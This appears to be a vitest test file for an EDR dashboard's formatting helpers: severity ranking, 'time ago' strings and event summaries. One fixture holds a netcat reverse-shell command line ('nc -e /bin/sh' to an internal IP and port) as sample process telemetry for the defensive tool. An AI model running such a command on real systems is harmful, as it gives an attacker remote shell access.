import { expect, it } from "vitest";
import type { EDREvent } from "../src/api/types";
import { severityRank, summarizeEvent, timeAgo } from "../src/format";

it("ranks severities critical first", () => {
  expect(severityRank("critical")).toBeLessThan(severityRank("high"));
  expect(severityRank("high")).toBeLessThan(severityRank("medium"));
  expect(severityRank("unknown")).toBeGreaterThan(severityRank("low"));
});

it("timeAgo picks the right unit", () => {
  const now = Date.parse("2026-07-11T12:00:00Z");
  expect(timeAgo("2026-07-11T11:59:30Z", now)).toBe("30s ago");
  expect(timeAgo("2026-07-11T11:15:00Z", now)).toBe("45m ago");
  expect(timeAgo("2026-07-11T02:00:00Z", now)).toBe("10h ago");
  expect(timeAgo("2026-07-06T12:00:00Z", now)).toBe("5d ago");
  expect(timeAgo(null, now)).toBe("never");
});

it("summarizes process events by cmdline", () => {
  const event = {
    event_id: "e1",
    time: "2026-07-11T10:00:00Z",
    event_type: "process_create",
    host: { hostname: "victim" },
    process: { pid: 42, name: "nc", cmdline: "nc -e /bin/sh 10.0.0.5 4444" },
  } as EDREvent;
  expect(summarizeEvent(event)).toBe("nc -e /bin/sh 10.0.0.5 4444");
});

it("summarizes network events as process -> dst", () => {
  const event = {
    event_id: "e2",
    time: "2026-07-11T10:00:00Z",
    event_type: "network_connection",
    host: { hostname: "victim" },
    network: { process_name: "nc", dst_ip: "10.0.0.5", dst_port: 4444 },
  } as EDREvent;
  expect(summarizeEvent(event)).toBe("nc -> 10.0.0.5:4444");
});
